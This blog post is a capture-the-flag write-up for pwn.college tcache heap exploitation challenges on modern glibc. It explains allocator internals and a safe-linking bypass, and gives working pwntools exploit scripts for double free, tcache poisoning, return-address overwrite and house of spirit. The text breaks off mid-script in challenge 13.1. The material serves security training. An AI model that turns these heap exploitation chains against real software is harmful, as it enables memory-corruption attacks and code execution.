---
layout: post
title:  "Pwn College - Tcache Exploitation"
date:   2024-05-20 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

Over the years, there were many heap exploitation techniques developed. Most of them can be found [here][heap-techniques] (there are other obscure techniques, not mentioned there). \
This module deals with a subset of these techniques, only involving the tcache, for a modern, `glibc-2.40`. 

I really liked this module. I've gained deeper understanding regarding tcache internals, and learned many new useful tricks. \
Challenges 15+ weren't trivial at all, and they've required learning the internals of tcache allocation process, including `tcache_perthread_struct` and its linker relation. Moreover, the demonstrated scenarios were much more realistic than previous modules - full mitigations (ASLR, NX, Full RELRO, PIE), no leaks, very limited primitives, etc. The fact that these latter challenges all uses safe-linking of a modern libc, is a huge bonus. \
I highly recommend this module for anyone interested in modern heap exploitation. 

## Background

### Memory Allocators

One approach of dynamically allocating memory is `mmap`. While it does allows dynamic allocation and deallocation for regions that surivves across functions (unlike the stack), the allocation size is inflexible, and requires kernel involvment for every call. \
A smarter solution is to write a library, that allocates a large chunk of memory (`brk`, not `mmap`, but having the same concept of large chunk allocation), and manage the small chunks allocations off it, based on demand. \
Current dynamic allocator of userland Linux is `ptmalloc2`, for its kernel - `kmalloc` (slab allocator), for FreeBSD it is `jemalloc` (which used in Android), for Windows - `Segment Heap, NT Heap`, for Chrome - `PartitionAlloc`. 

It is good to mention that the heap **HAVE NO RELATION** to the heap data structure. \
The heap provides the basic API of `malloc, free`, as well as more fancy stuff, such as `realloc, calloc` and others (`aligned_alloc`). 

Recall `ptmalloc` doesn't uses `mmap` but actually `brk`. \
`brk(addr)` expands the end of the data segment up to `addr`, while `sbrk(NULL)` returns the end, and `sbrk(delta)` increments the end by `delta` bytes. `ptmalloc` simply slices bytes off the data segment for small allocations, and uses `mmap` for very large allocations.

### Detection

We can detect some dynamic memory issues via `valgrind`. Also, glibc itself has some hardening techniques, in the cost of performance - `MALLOC_CHECK`, `MALLOC_PERTURB`, `MALLOC_MMAP_THRESHOLD` (making ALL allocations being done via `mmap`, lol). 

### Tcache

Thread Local Caching - feature of `ptmalloc` (and other popular allocators), to speed up repeated small allocations within a single thread. \
Implemented as singly-linked list. 
Notice there are separate tcache bins (linked lists) for every chunk sizes (by multiple of the alignment `0x10`). \
In each thread, theres one instance of `struct tcache_perthread_struct`, which tracks all various tcache bins heads (`tcache_entry *`), as well as the count of available chunks per bin. This is a readonly area. For fast accessing, this instance address resides at the second qword of data within every freed chunk (instead of `bk`). 

```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

typedef struct tcache_entry
{
    struct tcache_entry *next;
    struct tcache_perthread_struct *key;
} tcache_entry;
```

The last chunk within every bin (first freed chunk) contains its `next` set to `NULL`. \
Recall all allocated chunks contains metadata before them, of `0x10` bytes long (on 64-bit platforms). Moreover, allocations are always aligned to `0x10`. Hence, if we would allocate `0x1c` bytes (28 bytes), we would actually allocate chunk of size `align(0x2c,10) = 0x30` bytes. \
The chunk metadata contains its `size` and  `prev_size`, as well as `flags` (`PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA`). Notice `flags` are actually the lowest nibble within `size`, as the memory is aligned to `0x10`. An important bit is `PREV_INUSE`, which tracks whether or not the previous chunk is used (allocated). Its main usage is within consolidation of chunks, and **irrelevant** for tcache, which completely ignores this value. \
When chunk is freed, the `next` pointer is being updated to the previously head chunk. `next` is actually part of the data of a chunk, as it is now being un-used. For tcache, when something is freed, it is pushed to the HEAD of the list. 

Upon freeing, the right bin index is fetch based on the chunk size (which is part of the metadata). It checks for a double free, by naively inspecting the `key` offset of the chunk, and asserting it isn't equal to `tcache_perthread_struct` address. \
It then pushes the freed allocation as the head of the list, and updates `tache_perthread_struct`.  

For allocation, we simply calculate the correct bin index, checking the `tache_perthread_struct` count of that bin, and fetching the head of the bin. \
Notice that allocation does not clears all sensitive pointers (only `key`..), as well as doesn't verifies if the `next` address of the previously-head chunk makes sense. 

#### Double Free

In order to address double free, the `key` mitigation was added. The relevant error message of the check is `"double free detected in tcache 2"`, and the check being made is simply compare of `e->key == tcache` (if it holds, it means double free occured). \
Notice it handles the case of a coincidence, where the user data simply had the `tcache_perthread_struct` as its second qword data (it does so by traversing all chunks of that bin. If the chunk to be freed isn't there, it assumes it really is allocated). \
If we can write to the freed chunk, by simply overwriting the second qword to **any** other value that is not `tcache` value, we would be able to pass this check and perform another free! \
The double free gives us a strong primitive, where we can have multiple object instances pointing to the same underlying chunk (as 2 malloc calls would return the same address).

#### Tcache Poisoning

Corrupting `tcache_entry->next`. This means `malloc` would return address of our wish, upon allocation. Hence, a chunk to arbitrary address. \
This may be very usefull primitive to leverage towards arbitrary R/W. 

### Chunks and Metadata

For tcache, the data region of the allocation (`user_data`) is reused for tcache metdata - `next` and `key`. It is called "in-chunk" metadata. \
Recall the actual `chunk_addr` starts `0x10` bytes before the `mem_addr` (the address that is returned via `malloc`). \
The metadata that resides before `user_data` are `mchunk_prev_size` and `mchunk_size` (which also includes flags). These mostly used for consolidation of chunks, and unlike the tcache metadata - resides despite of the specific cache (bin) being used. \
Notice that `prev_size` contains a legitimate value only incase the previous chunk is freed. In case the previous chunk is allocated, it can use the `prev_size` of the next chunk as extra storage! This is an optimization for the case of an allocation with nibble of `0x8`. \
This means that the following holds:

```c
void *a = malloc(0x10);  
void *b = malloc(0x10);
memset(a, 'A', 0x10);
/*
a->size = 0x21
a->prev_size = 0
b->size = 0x21
b->prev_size = 0
*/
void *a = malloc(0x18);  
void *b = malloc(0x18);
memset(a, 'A', 0x18);
/*
a->size = 0x21
a->prev_size = 0
b->size = 0x21 
b->prev_size = 0x4141414141414141
*/
```

As we can see, the `size` still stands for `0x21`, as the size of the allocated chunk is exactly the same. \
However, this time chunk `a` uses the `prev_size` of chunk `b` as extra storage - interesting optimization. The overlapping metadata is completely intended behavior of glibc heap. 

### Ptmalloc Caches

For `libc-2.31`, ptmalloc contains: 

1. 64 singly-linked lists for tcache bins - sizes of `16` to `1032`. 

2. 10 Singly linked fastbins allocations, up to `160` bytes

3. 1 doubly linked unsorted bin, stashes freed chunks that don't fit to the tcache / fastbins. 

4. 64 doubly-linked smallbins, up to `512` bytes.

5. Doubly linked largebins, for over `512` bytes. 

6. `mmap` support for large enough chunks

Notice tcache completely covers the smallbins and fastbins. But there are 2 key differences between tcache and fastbins: 

1. While every tcache bin has a finite size, the fastbins do not - and may be infinitely long. This means that in order to start populating the fastbins, all we have to do is to make the corresponding tcachebin being full. 

2. The key difference - the tcache is a memory-manager mechanism specific for a thread. This means that its chunks would NEVER be reused by another thread. However, the fastbins aren't thread specific - and a same memory region may be reclaimed by multiple threads. 

3. Since the tcache is thread specific, its controlling block, the `tcache_perthread_struct`, resides **within the thread's heap**. The tcache bins are also referenced by the `mp` struct, located within libc. However, for fastbins the controlling block is the thread's arena - which tracks the current fastbins heads. 

The in-chunk metadata is dependent on the specific cache. For example, in case a chunk is moved from the unsorted bin into a largebin, it would contain the largebin metadata, not tcache metadata - `fd, bk, fd_nextsize, bk_nextsize`. 

### Wilderness

Upon allocation, if no adequate chunk resides within any bin, the allocator would try to allocate off the end of heap - the `top_chunk` - the wilderness, which is the last chunk that resides at the end of the heap. This is a fake chunk, that only have a `size` attribute. \
If it failed, AND the allocation is huge - the allocator would call `mmap`. Otherwise, if there's no space but the chunk is relatively small, the allocator would call `brk` to expand the heap. 

### Metadata Corruption

Historical attacks (not specific to tcache) includes unsafe unlink (overwrite `fd, bk` values), poison null byte (overwrite `size` of the next chunk), house of force (overwrite `top_chunk` size, wrapping the VA space), and more. \
Under certain scenarios, safe unlinking can be done (on an existing pointer), and posion null byte can be done. 

#### House of Spirit

Still unpatched. The idea is simple - forge something that looks like a chunk, `free` it, and the next `malloc` would return that chunk to us. If we can overwrite a pointer, we would be able to `malloc` into a stack pointer, for example. \
Can be done with or without tcache (for older versions of glibc, usually the fastbins). This means the idea is to "inject" a fake chunk into the tcache. 

```c
malloc_chunk stack_chunk = { 0 };
stack_chunk.prev_size = 0;
stack_chunk.size = 0x21;
free(&stack_chunk.fd);

a = malloc(0x10);
// Now a is allocated on the stack!
```

Very simple, very powerful. Can be triggered easily in case we obtain a somewhat arbitrary `free` primitive. 

#### Uncooperative `malloc` Calls

Sometimes the program won't contain direct `malloc` calls. In such cases, we can use `printf, scanf` and others, which uses `malloc` internally. \
Upon debugging, we usually won't like this functionality of `printf`. We can disable it via `setbuf(stdout, NULL)`. 

### Tcache Safe Linking

Corruption of the `next` pointer is very valuable, and can easily yield arbitrary write primitive. The introduced mitigation mangles the `next` pointer, by XORing it with a random value within freed chunks. \
In addition to mangling `next` ptrs of freed chunks, demangled pointers least-significant nibble is **enforced** to be `0x0`. \
Interestingly, the random value used by `PROTECT_PTR, REVEAL_PTR` is a shift of the position of the pointer - meaning `&ptr >> 12` (the first 3 nibbles are offset to a page, hence aren't affected by ASLR. We do want the result to be randomized, tho). \
This also means that due to ASLR, every time the program runs, the random key would be altered!

Within `malloc` implementation, `tcache_get` uses `REVEAL_PTR` as it needs to decrypt `e->next` and return its value. \
Interesntingly, in order to resolve bins heads, inside the `tcache_perthread_struct` there are only **demangled pointers**. \
Within `free`, `tcache_put` mangles the `next` pointer via `PROTECT_PTR`. 

#### Bypass Technique

Recall `PROTECT_PTR` is a reversible operation. We need 2 values - `pos` and `ptr`. \
However, `REVEAL_PTR` is fully reversible from obfuscated pointer alone, as it uses `pos == &ptr`. Since all of this occurs within the heap, it is likely that `ptr >> 12` is roughly equivalent to `pos` itself (incase the `ptr` resides within the first page of the heap, it equals). This means that `REVEAL_PTR` is usually reversible from the mangled value, alone. \
This means we can take a mangled value, and get back a valid heap pointer. Notice that the reason behind this, is because we assume the region where the pointer exists is identical to the pointed address region (because `next` ptr resides within a chunk on the heap, and points to another chunk on the heap). This trick wouldn't work, in case the pointer wouldv'e been stored in a different memory region than the pointed object. 

Getting back to `PROTECT_PTR`, since we can actually retrieve `pos` out of a mangled pointer, this IS a reversible operation. This means that upon retrieving a mangled pointer value (any within the heap), we gain the primitive of forging a mangled pointer out of a valid pointer we own (re-mangle things before overwriting `next` ptrs). \
By assuming both the chunk and its `next` ptr were allocted on the same page (which usually holds for small allocations), we can easily create `demangle` method. 

```python
def mangle(addr, value):
    return (addr >> 12) ^ value

def demangle(mangled):
    o = mangle(mangled, mangled)
    return (o >> 24) ^ o
```

Notice this script can be easily adapted to the case where the chunk and its `next` ptr aren't within the same page. 

TL;DR - in case we have heap leak primitive, we can easily defeat this mitigation. 

## Challenge 1

I've set `pwndbg` environment for all challenges from now on. Its heap commands documentation can be found [here][pwndbg-docs].

Upon launching the challenge, the heap is in the following state:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x556060c7c000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x556060c7c290
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x556060c7c2b0
Size: 0x20d50 (with flag bits: 0x20d51)

pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty

pwndbg> tcache
tcache is pointing to: 0x556060c7c010 for thread 1
{
  counts = {0 <repeats 64 times>},
  entries = {0x0 <repeats 64 times>}
}
```

Other useful commands may be `vis_heap_chunks` and `malloc_chunk`. 

Upon allocating the flag buffer via `read_flag`, it is being allocated off the `top_chunk` (can be seen via `heap`). Of course, the bins resides empty as this chunk isn't freed. 

We can exploit this challenge by creating a UAF - making the flag allocation to be performed off the tcache of size `0x250`, then calling `puts` on the freed slot:

```python
def malloc(p, size):
    p.sendline(b'malloc')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'quit): ')

def free(p):
    p.sendline(b'free')
    p.recvuntil(b'quit): ')

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    size = 574
    malloc(p, size)
    free(p)
    p.sendline(b'read_flag')
    p.sendline(b'puts')
    
    p.interactive()
```

## Challenge 2

Now the allocation size is actually being randomized. \
My idea is to simply try all possible chunks allocation sizes, re-allocating the flag after each of them (so it would hopefully be allocated within the candidate bin) and try to leak the flag via `puts`.

```python
def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')

def puts_flag(p):
    p.sendline(b'puts')
    output = p.recvuntil(b'quit): ')
    if b'pwn.college' in output:
        print(f'OUTPUT:{output}')
        exit(0)

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, size)
        free(p)
        read_flag(p)
        puts_flag(p)
        
    p.interactive()
```

## Challenge 3

Now the flag buffer is actually being allocated twice before it is written. Hence, we'd like our target bin to contain 2 available chunks. 

```python
def malloc(p, index, size):
    p.sendline(b'malloc')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'quit): ')

def free(p, index):
    p.sendline(b'free')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'quit): ')

def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')

def puts_flag(p, index):
    p.sendline(b'puts')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    output = p.recvuntil(b'quit): ')
    if b'pwn.college' in output:
        print(f'OUTPUT:{output}')
        exit(0)

def exploit():    
    debug = False
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, 0, size)
        malloc(p, 1, size)
        free(p, 0)
        free(p, 1)
        read_flag(p)
        puts_flag(p, 0)
        
    p.interactive()
```

## Challenge 4

This challenge can manage only up to 1 unique allocations. However, flag is being allcoated 2 times before it is used. \
This means we would like to populate its bin with 2 chunks. We can do so by exploiting double free on that chunk, which only requires writing SOMETHING to `tcache_entry.key`. 

```python
def scanf(p, buf):
    p.sendline(b'scanf')
    p.sendline(buf)
    p.recvuntil(b'quit): ')

def exploit():    
    debug = False
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    buf = b'A' * 8 + b'B'
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, size)
        free(p)
        scanf(p, buf)
        free(p)
        read_flag(p)
        puts_flag(p)
        
    p.interactive()
```

Notice I've used linear heap overflow to the freed chunk, which overwrote both `next` and `key`. In that case, `next` was overwritten to `0x4141414141414141` and `key` LSB to `0x42` (and `0x0a` due newline..). \
The most interesting finding within this challenge, is the fact that upon triggering the second free, it actually "fixes" the overwritten `next` pointer is restored:

Before double free:

```bash
0x557495a182b0  0x0000000000000000      0x00000000000003b1      ................                                                                                                                                                                                   
0x557495a182c0  0x4141414141414141      0x0000557495a10042      AAAAAAAAB...tU..         <-- tcachebins[0x3b0][0/1]
```

After: 

```bash
0x557495a182b0  0x0000000000000000      0x00000000000003b1      ................
0x557495a182c0  0x0000557495a182c0      0x0000557495a18010      ....tU......tU..         <-- tcachebins[0x3b0][0/2], tcachebins[0x3b0][0/2]
```

## Challenge 5

This challenge is interesting. After allocating the flag buffer, it sets its chunk `next` pointer to `NULL`. In order to print the flag, a check is being performed on the flag buffer, checking its `next` is NOT a `NULL`. 
This means we should actually free the flag buffer, which in the case of a non-empty bin, would set its `next` pointer. 

But how can we free the flag buffer without any leak? 
The idea is simple - first, allocate chunk of the known flag chunk size - `1000`. Then free it, and allocate the flag chunk. This would make the flag address resides within `slot[0]`. Then, when the flag is allocated, allocate another chunk of size `1000` at `slot[1]` and free it, making sure the flag's bin isn't empty. 
Now, when we would free `slot[0]`, it would set the flag's `next` pointer to `slot[1]` chunk's value.

This is pretty cool. This challenge demonstrates how we can manipulate a chunk, without any UAF vuln. The only vuln used here, is the fact that the slot heap addresses aren't being nullified upon a `free`. 

```python
size = 1000
malloc(p, 0, size)
free(p, 0)
read_flag(p)  # Now flag address is stored within slot[0]

malloc(p, 1, size)
free(p, 1)  # The bin corresponding to flag size isn't empty

free(p, 0)  # free the flag chunk, now setting its 'next' ponter to slot[1] value. 
        
puts_flag(p)
```

## Challenge 6

We want to obtain read primitive. \
My plan is to corrupt a free chunk's `next` pointer. That way, whenever we would allocate twice off that bin, we should have a chunk allocated to the goal address. From there, a simple `puts` of the chunk would give us the secret value.

```python
def exploit():
    p = process(BINARY)
    secret_addr = get_leak_addr(p)
    print(f'secret_addr: {hex(secret_addr)}')

    buf = struct.pack('<Q', secret_addr)
    # for size in range(0x10, 0x800, 0x10):
    size = 0x80
    print(f'Trying size:{size}')
    malloc(p, 0, size)
    malloc(p, 1, size)
    free(p, 1)
    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
    scanf(p, 0, buf)  # Overwrite its next pointer to our secret
    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
    malloc(p, 3, size)  # Now the chunk is allocated on the secret, which address is stored on slot 3!
    data = puts(p, 3)
    print(f'got data: {data}')
    send_flag(p, data)
        
    p.interactive()
```

## Challenge 7

Similar to before, but this time the secret value is 16 bytes long. \
At a first glance, the solution should be identical. However, notice that upon allocation, the allocator nullifies the `tcache_perthread_struct` member, hence the second qword. \
We can still bypass this if we would leak 8 bytes at a time, from the end of the secret. 

A simpler approach is to overwrite the whole secret, as it is completely controlled by the allocated chunk.

```python
def allocate_chunk_at_addr(p, addr):
    buf = struct.pack('<Q', addr)
    size = 0x80
    malloc(p, 0, size)
    malloc(p, 1, size)
    free(p, 1)
    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
    scanf(p, 0, buf)  # Overwrite its next pointer to our secret
    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
    malloc(p, 3, size)  # Now the chunk is allocated on the secret, which address is stored on slot 3!
    data = puts(p, 3)
    print(f'addr[0]: {data}')  # Leaks first 8 bytes

    return data

def exploit():
    p = process(BINARY)
    secret_addr = 0x426966
    print(f'secret_addr: {hex(secret_addr)}')

    allocate_chunk_at_addr(p, secret_addr)
    my_secret = b'A' * 16
    scanf(p, 3, my_secret)  # Corrupt secret with known value
    send_flag(p, my_secret)

    p.interactive()
```

## Challenge 8

Similar to before, but now the address contains whitespaces within its LSB. Hence, we won't be able to pass it via `scanf`. \
My idea is to pass another address right before it, which doesn't contains any whitespace characters. 

```python
def exploit():
    orig_secret_addr = 0x42ce0a
    pad = 2
    secret_addr = orig_secret_addr - pad
    print(f'secret_addr: {hex(secret_addr)}')

    allocate_chunk_at_addr(p, secret_addr)

    my_secret = b'A' * (pad + 16)
    scanf(p, 3, my_secret)  # Corrupt secret with known value
    send_flag(p, my_secret)

    p.interactive()
```

## Challenge 9

Now we cannot make near allocations (`0x10000` bytes) to the goal secret. \
Recall we can still create a chunk that contains within its `next` our goal buffer. 

My original idea is to somehow utilize the fact that upon a `malloc` call, the `key` parameter is being nulled out. Moreover, notice the wierd ordering that happens while performing the boundary check: it first does the `malloc`, and if boundary check failed - report the error and nullifies the right slot. Anyways, it DOES performs the allocation!
This means we can clear the secret this way. 

```python
def exploit():
    p = process(BINARY)
    secret_addr = 0x424b3e
    pad = 0
    print(f'secret_addr: {hex(secret_addr)} pad: {hex(pad)}')
    # Utilize the fact that allocations nullifies the 'key' member, hence clear the whole flag
    allocate_chunk_at_addr(p, secret_addr - 8)
    allocate_chunk_at_addr(p, secret_addr)
    my_secret = b'\x00' * 16
    send_flag(p, my_secret)
    p.interactive()
```

## Challenge 10

Redirect control flow by overwritign main's ra. 

```python
def exploit():
    p = process(BINARY)
    main_ra = get_leak_addr(p) + 280
    pie_base = get_leak_addr(p) - p.elf.symbols['main']
    assert(pie_base & 0xfff == 0)
    win_addr = pie_base + p.elf.symbols['win']
    print(f'main_ra: {hex(main_ra)} win_addr: {hex(win_addr)}')

    # Utilize the fact that allocations nullifies the 'key' member, hence clear the whole flag
    allocate_chunk_at_addr(p, main_ra)
    buf = struct.pack('<Q', win_addr)
    scanf(p, 3, buf)
    p.sendline(b'quit')
```

## Challenge 11

Now the binary is full-mitigated, and there are no leaks. However, we have the option to call `echo` on a pointer and an offset within a slot. Under the hood, it spawns a child process, execs `/usr/bin/echo`, and sends the desired address as `argv[2]`. \
If we get a `libc` leak, we can simply get a stack leak too, as all it requires is to leak `environ`. From the stack, it should be pretty trivial to leak the program's base. \
Obtaining a heap leak is trivial using the `next` pointer. My idea is to scan the heap for any other region pointers, such as `libc, stack` or `program`.

For this exact reason, pwndbg contains the awesome tool `p2p` - which searches pointer to pointer chains. Given a mapping, it searches for all pointers that point to a specified mapping. Notice we can state program / libc as simply writing the mapped file:

```bash
pwndbg> p2p heap /challenge/babyheap_level11.0
00:0000│  0x563c523c0ce8 (__init_array_start) —▸ 0x563c523bd4e0 (frame_dummy) ◂— endbr64 
00:0000│  0x563c523c0cf0 (__init_array_start+8) —▸ 0x563c523bd500 (get_heap_location) ◂— endbr64 
00:0000│  0x563c523c0cf8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x563c523bd4a0 (__do_global_dtors_aux) ◂— endbr64 
00:0000│  0x563c523c0d78 (_DYNAMIC+120) —▸ 0x563c523bc3a0 ◂— 0x1f00000003
00:0000│  0x563c523c0d88 (_DYNAMIC+136) —▸ 0x563c523bc700 ◂— 0x6f732e6362696c00
00:0000│  0x563c523c0d98 (_DYNAMIC+152) —▸ 0x563c523bc3d0 ◂— 0
00:0000│  0x563c523c0dd8 (_DYNAMIC+216) —▸ 0x563c523c0ef0 (_GLOBAL_OFFSET_TABLE_) ◂— 0x4d00
00:0000│  0x563c523c0e08 (_DYNAMIC+264) —▸ 0x563c523bca00 ◂— 0x4f08
00:0000│  0x563c523c0e18 (_DYNAMIC+280) —▸ 0x563c523bc8f8 ◂— 0x4ce8
00:0000│  0x563c523c0e88 (_DYNAMIC+392) —▸ 0x563c523bc872 ◂— 0x2000200020000
00:0000│  0x563c523c1008 (__dso_handle) ◂— 0x563c523c1008 (__dso_handle)
```

However, this feature seems abit buggy - as it actually parsed the program's addresses space, not the heap. \
Other tools, (that are now actually documented and should work) are `probeleak` and `leakfind`. 

```bash
pwndbg> probeleak 0x563c523e7000 0x21000
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
0x000c8: 0x0000563c523e7350 = (rw-p) [heap] + 0x350
0x00358: 0x0000563c523e7010 = (rw-p) [heap] + 0x10
```

The printings were blue, meaning the found pointers were all heap pointers. 

At this point I think there's something I'm missing within the `echo` handler. Recall its implementation - it uses 6-byte array to store the `"Data:"` string, and right after them, stores the stack canary. By looking at the decomiled code, it seems to be calling `strcpy` to copy the string into the stack. However, by inspecting the assembly, there are only `mov` operations being made. \
This argument is used as `argv[1]`, where our `ptr + offset` are used as `argv[2]`. Moreover, notice that this handler actually uses a call for `malloc(0x20)` for the `argv` buffer. This actually gives us an arbitrary write primitive:

```c
argv = (char **)malloc(0x20);
*argv = "/bin/echo";
argv[1] = (char *)v4;
argv[2] = (char *)(ptr + offset);
```

Because we can fully control `argv` address returned by this malloc, and we control `ptr + offset`, we can basically write to anywhere we want, but we still have no leaks. \
A trick we can do, is to utilize the fact that `v4`, which is a stack address, is being written to the returned buffer. This means we can leak a stack address, by making sure the `argv` chuck is reused by one of our notes. 
This is pretty cool - the only vuln here, is the fact that the chunk's pointer within the slot isn't being nullified. Moreover, notice the first qword of the returned chunk is actually loaded with `"/bin/echo"` - which is part of the program's address space, hence yielding a PIE leakage. 

Because our final goal is having both stack and PIE leaks, we can perform the following:

1. `malloc` and `free` a chunk of `0x20`, within `slot[0]`. 

2. Call `echo` for `slot[0]` and `offset = 0`. Its `argv` would be allocated off the right tcache bin. Moreover, it would set the pointer to-be-read as `slot[0]`, which is `argv`. Hence, this would give us PIE program leak - the address of `"/bin/echo"`. 

3. Now we have two approaches. We can use the PIE program leak, in addition to overwriting the `next` ptr of chunks to addresses of our wish, in order to read pointers off the program. Then, we would call the `echo` handler for indices corresponding to the overwritten chunks. It would give us `libc` leakage (from GOT entries, for example). Having `libc` leak, we can repeat the process by reading its `environ` to obtain a stack leak. Notice this approach doesn't use the fact of `v4` overwrite at all, nor `offset`, hence probably not the intended solution (but much cooler). Another option is to use the fact that `echo` actually support printing with an offset. If we would repeat the exact process of 1+2, but provide `offset = 8`, we would obtain `v4` leak. Easy. 

Another thing we have to consider, is the fact that `win` has an `LSB` of `\x00`. In order to bypass the `scanf` call, I've simply jumped to `win + 4`. 

```python
def echo(p, index, offset):
    p.sendline(b'echo')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Offset: ')
    p.sendline(str(offset).encode())
    p.recvuntil(b'Data: ')
    data = p.readline()[:-1] + b'\x00' * 2
    assert(len(data) == 8)
    data = struct.unpack('<Q', data)[0]
    p.recvuntil(b'quit): ')

    return data

def exploit():
    p = process(BINARY)
    malloc(p, 0, 0x20)
    free(p, 0)
    bin_echo_offset = next(p.elf.search(b"/bin/echo"))
    pie_base = echo(p, 0, 0) - bin_echo_offset
    assert(pie_base & 0xfff == 0)
    win_addr = pie_base + p.elf.symbols['win']

    malloc(p, 0, 0x20)
    free(p, 0)
    main_ra = echo(p, 0, 8) + 374
    print(f'main_ra: {hex(main_ra)} win_addr: {hex(win_addr)}')

    allocate_chunk_at_addr(p, main_ra)
    buf = struct.pack('<Q', win_addr + 4)  # win_addr has LSB of 0. We have to jump somewhere near. 
    scanf(p, 3, buf)
    p.sendline(b'quit')

    p.interactive()
```

Notice that the exploit isn't 100% reliable. This is ok, as the reason behind this is `main_ra` and `win_addr` sometimes having some additional whitespace characters. 

## Challenge 12

This time, our goal is for `malloc` to return a stack pointer. The handler `stack_malloc_win` performs a `malloc` request, and in case it returns a goal `stack_ptr` - calls `win`. \
Notice we have a primitive to `free(stack_ptr)`, as well as writing to `64` bytes long buffer, resides right before the `stack_ptr`. 

So it seems the goal of this challenge is to perform house-of-spirit, meaning to create a valid chunk on the stack, and injecting it into the tcachebin.

```python
def exploit():
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    buf = b'A' * 0x30
    buf += b'B' * 8  # prev_size
    buf += struct.pack(b'<Q', 0x41)  # size, malloc of 0x2b corresponds to chunk 0x40
    stack_scanf(p, buf)
    stack_free(p)
    stack_malloc_win(p)

    p.interactive()
```

Worth to mention - `malloc(0x53)` request is treated with the same trick as `malloc(0x58)` - meaning it would re-use the `prev_size` of the preceding chunk, and allocate itself within `tcachebin[0x60]`.


## Challenge 13

Now, after injecting a stack chunk into the tcache, we'd like to read data off it via `free`. \
In a similar manner, we can create a fake chunk on the stack and free it. \
Then, we can allocate again, where the allocation would be performed on the stack-chunk, giving us write primitive on the stack, optionally overwriting the secret. 

The problem is we can only write up to 127 bytes into the allocated stack chunk... We can try another approach - after injecting the stack chunk into the tcache, we can free another chunk off the same bin, so that its `next` would be the stack pointer. It would grant us leak of the stack pointer. \
From this, we would be able to forge another fake chunk, via `allocate_chunk_at_addr`. Since we cannot write to a chunk within this challenge, as `scanf("%0s")` is being used, we have to make sure we would be allocated right on the secret address. 

Therefore, my solution involves forcing an allocation right off the secret address. Notice, however, that it nullifies the second qword of the secret. \
Moreover, upon inserting the expected secret, there are garbage 8 bytes on the input. Hence, we have to nullify them too so the secrets would match. 

The following might be abit overkill, but it gets the job done:

```python
def allocate_chunk_at_addr(p, addr, size):
    '''
    Allocates chunk at specified addr. Accessible within slot[3]
    '''
    buf = struct.pack('<Q', addr)
    malloc(p, 0, size)
    malloc(p, 1, size)
    free(p, 1)
    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
    scanf(p, 0, buf)  # Overwrite its next pointer to our addr
    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
    malloc(p, 3, size)  # Now the chunk is allocated on the addr, which address is stored on slot 3!

    return

def exploit():
    p = process(BINARY)
    p.recvuntil(b'at ')
    leak = int(p.readline()[:-2], 16)
    print(f'secret: {hex(leak)}')
    p.recvuntil(b'quit): ')
    
    alloc_size = 0xa2
    buf = b'A' * 0x30
    buf += b'B' * 8  # prev_size
    buf += struct.pack(b'<Q', (alloc_size & 0xf0) + 0x11)  # size. 
    malloc(p, 0, alloc_size)
    stack_scanf(p, buf)
    stack_free(p)
    free(p, 0)
    stack_pointer_leak = puts(p, 0) + b'\x00' * 2  # leak the next_ptr of the chunk
    assert(len(stack_pointer_leak) == 8)  # may contain white characters..
    stack_pointer_leak = struct.unpack('<Q', stack_pointer_leak)[0]  # Leaks the address of the stack_ptr
    print(f'stack_leak: {hex(stack_pointer_leak)}')

    secret_addr = stack_pointer_leak + alloc_size
    allocate_chunk_at_addr(p, secret_addr, 0x80)
    print(f'allocated chunk at addr: {hex(secret_addr)}')
    secret_leak = puts(p, 3)
    print(f'got data: {secret_leak}')

    allocate_chunk_at_addr(p, secret_addr + 0x1e, 0x80)  # Nullify the second qword
    send_flag(p, secret_leak)

    p.interactive()
```

## Challenge 13.1

Unlike challenge 13, this time the secret resides at offset `0x80`. Moreover, the LSB of the secret is always `0x00`, hence we won't be able to leak the first qword of it. 

```python
def exploit():
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    alloc_size = 0xa0  # arbitrary size
    buf = b'A' * 0x30
    buf += b'B' * 8  # prev_size
    buf += struct.pack(b'<Q', (alloc_size & 0xf0) + 0x11)  # size. 
    malloc(p, 0, alloc_size)
    stack_scanf(p, buf)
    stack_free(p)
    free(p, 0)
    stack_pointer_leak = puts(p, 0) + b'\x00' * 2  # leak the next_ptr of the chunk
    assert(len(stack_pointer_leak) == 8)  # may contain white characters..
    stack_pointer_leak = struct.unpack('<Q', stack_pointer_leak)[0]  # Leaks the address of the stack_ptr
